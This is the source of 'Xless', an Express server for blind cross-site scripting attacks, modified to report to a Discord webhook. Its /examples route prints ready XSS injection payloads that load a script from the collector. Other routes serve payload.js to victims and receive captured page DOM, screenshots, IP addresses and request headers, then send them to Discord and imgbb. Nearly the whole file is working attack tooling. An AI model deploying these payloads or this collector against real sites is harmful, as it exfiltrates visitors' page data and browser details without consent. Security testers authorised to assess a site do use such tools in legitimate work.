// Xless: The Serverlesss Blind XSS App.
// Version: v1.2
// Author: Mazin Ahmed <mazin@mazinahmed.net>
// Modified: Discord webhook support

const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");
const path = require("path");

require("dotenv").config();

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY;
const discord_webhook = process.env.SLACK_INCOMING_WEBHOOK;

const app = express();
app.use(cors());

app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use(function (req, res, next) {
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// Send message to Discord webhook
function sendDiscord(message) {
  request.post(discord_webhook, {
    json: { content: message, username: "XLess" },
  });
}

function generate_blind_xss_alert(body) {
  var alert = "**XSSless: Blind XSS Alert**\n";
  for (let k of Object.keys(body)) {
    if (k === "Screenshot") continue;
    if (k === "DOM") body[k] = `\n\n${body[k]}\n\n`;
    if (body[k] === "") {
      alert += "**" + k + ":** ```None```\n";
    } else {
      alert += "**" + k + ":** ```" + body[k] + "```\n";
    }
  }
  return alert;
}

function generate_callback_alert(headers, data, url) {
  var alert = "**XSSless: Blind XSS Triggered!**\n";
  alert += `• **IP Address:** \`${data["Remote IP"]}\`\n`;
  alert += `• **Triggered on:** \`${url}\`\n`;
  for (var key in headers) {
    if (headers.hasOwnProperty(key)) {
      alert += `• **${key}:** \`${headers[key]}\`\n`;
    }
  }
  return alert;
}

function generate_message_alert(body) {
  var alert = "**XSSless: Message Alert**\n";
  alert += "```\n" + body + "```\n";
  return alert;
}

async function uploadImage(image) {
  return new Promise(function (resolve, reject) {
    const options = {
      method: "POST",
      url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
      port: 443,
      headers: { "Content-Type": "multipart/form-data" },
      formData: { image: image },
    };
    request(options, function (err, imgRes, imgBody) {
      if (err) reject(err);
      else resolve(imgBody);
    });
  });
}

app.get("/examples", (req, res) => {
  res.header("Content-Type", "text/plain");
  var url = "https://" + req.headers["host"];
  var page = "";
  page += `\'"><script src="${url}"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
  page += `<script>$.getScript("${url}")</script>`;
  res.send(page);
  res.end();
});

app.all("/message", (req, res) => {
  var message = req.query.text || req.body.text;
  const alert = generate_message_alert(message);
  sendDiscord(alert);
  res.send("ok\n");
  res.end();
});

app.post("/c", async (req, res) => {
  let data = req.body;
  data["Screenshot URL"] = "";

  if (imgbb_api_key && data["Screenshot"]) {
    const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,", "");
    try {
      const imgRes = await uploadImage(encoded_screenshot);
      const imgOut = JSON.parse(imgRes);
      if (imgOut.error) {
        data["Screenshot URL"] = "NA";
      } else if (imgOut.data && imgOut.data.url_viewer) {
        data["Screenshot URL"] = imgOut.data.url_viewer;
      }
    } catch (e) {
      data["Screenshot URL"] = e.message;
    }
  }

  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const alert = generate_blind_xss_alert(data);
  sendDiscord(alert);
  res.send("ok\n");
  res.end();
});

app.get("/health", async (req, res) => {
  let health_data = {};
  health_data.IMGBB_API_KEY = imgbb_api_key !== undefined;
  health_data.DISCORD_WEBHOOK = discord_webhook !== undefined;
  res.json(health_data);
  res.end();
});

app.all("/*", (req, res) => {
  var headers = req.headers;
  var data = req.body;
  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const alert = generate_callback_alert(headers, data, req.url);
  sendDiscord(alert);
  res.sendFile(path.join(__dirname + "/payload.js"));
});

app.listen(port, (err) => {
  if (err) throw err;
  console.log(`> Ready On Server http://localhost:${port}`);
});
